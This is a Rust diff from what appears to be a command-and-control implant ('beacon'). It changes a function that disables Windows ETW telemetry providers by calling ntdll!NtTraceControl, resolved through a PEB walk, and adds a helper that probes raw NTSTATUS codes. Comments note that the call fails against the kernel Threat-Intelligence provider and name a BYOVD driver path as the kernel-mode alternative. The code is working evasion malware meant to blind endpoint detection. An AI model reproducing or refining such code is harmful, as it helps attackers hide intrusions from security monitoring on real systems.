@@ -211,10 +211,36 @@ pub unsafe fn blind() -> (bool, bool) {
 /// If the byte-patch is somehow reverted, the disabled provider still won't
 /// fire. Best-effort: returns Ok on success, Err otherwise (caller ignores).
 ///
+/// **Scope honesty (verified on Server 2019):** `NtTraceControl` with
+/// `EtwpNotificationRegistrar` is the USER-MODE provider registration path. For
+/// a KERNEL provider like `Microsoft-Windows-Threat-Intelligence` this returns a
+/// negative NTSTATUS (observed `STATUS_ACCESS_DENIED`-class) — the kernel ETW
+/// provider's `IsEnabled` is owned by the kernel and is only writable from
+/// kernel mode (the BYOVD `EtwTiBlind` path). This call still has value for
+/// USER-MODE providers; for ETW-TI it is a no-op that surfaces its limitation.
+/// See [`disable_etw_provider_status`] to probe the exact NTSTATUS.
+///
 /// # Safety
 /// Resolves `ntdll!NtTraceControl` via PEB walk; calls it with a stack buffer.
 /// Single-threaded beacon context.
 pub unsafe fn disable_etw_provider(guid: &[u8; 16]) -> Result<(), &'static str> {
+    let st = unsafe { disable_etw_provider_status(guid, 0x0027) };
+    if st >= 0 {
+        Ok(())
+    } else {
+        Err("NtTraceControl disable failed")
+    }
+}
+
+/// Low-level: call `NtTraceControl` with the given control code + EnableInfo
+/// (IsEnabled=0) and return the RAW NTSTATUS. Used to probe which control codes
+/// the kernel accepts for a given provider (task C: digging into why the
+/// ETW-TI disable fails). `control_code` is the Etwp* code (e.g. 0x0027 =
+/// EtwpNotificationRegistrar, 0x0028 = EtwpNotificationRemove).
+///
+/// # Safety
+/// Resolves + calls ntdll!NtTraceControl with a stack buffer. Beacon context.
+pub unsafe fn disable_etw_provider_status(guid: &[u8; 16], control_code: u32) -> i32 {
     type NtTraceControl = unsafe extern "system" fn(
         u32,
         *const core::ffi::c_void,
@@ -223,11 +249,12 @@ pub unsafe fn disable_etw_provider(guid: &[u8; 16]) -> Result<(), &'static str> 
         u32,
         *mut u32,
     ) -> i32;
-    let addr = crate::resolve::export_addr(b"ntdll.dll", b"NtTraceControl")
-        .ok_or("NtTraceControl unresolved")?;
+    let addr = match crate::resolve::export_addr(b"ntdll.dll", b"NtTraceControl") {
+        Some(a) => a,
+        None => return -0x7FFF_FFFF, // sentinel: unresolved
+    };
     let ntc: NtTraceControl = core::mem::transmute(addr);
-    // Build the disable request buffer: provider GUID + reserved + IsEnabled=0.
-    // ControlCode 0x0027 = EtwpNotificationRegistrar (disable provider).
+    // EnableInfo: provider GUID + reserved + IsEnabled=0.
     #[repr(C)]
     struct EnableInfo {
         guid: [u8; 16],
@@ -236,19 +263,14 @@ pub unsafe fn disable_etw_provider(guid: &[u8; 16]) -> Result<(), &'static str> 
     }
     let ei = EnableInfo { guid: *guid, _reserved: [0; 8], is_enabled: 0 };
     let mut ret_len: u32 = 0;
-    let st = unsafe {
+    unsafe {
         ntc(
-            0x0027,
+            control_code,
             &ei as *const EnableInfo as *const core::ffi::c_void,
             core::mem::size_of::<EnableInfo>() as u32,
             core::ptr::null_mut(),
             0,
             &mut ret_len,
         )
-    };
-    if st >= 0 {
-        Ok(())
-    } else {
-        Err("NtTraceControl disable failed")
     }
 }
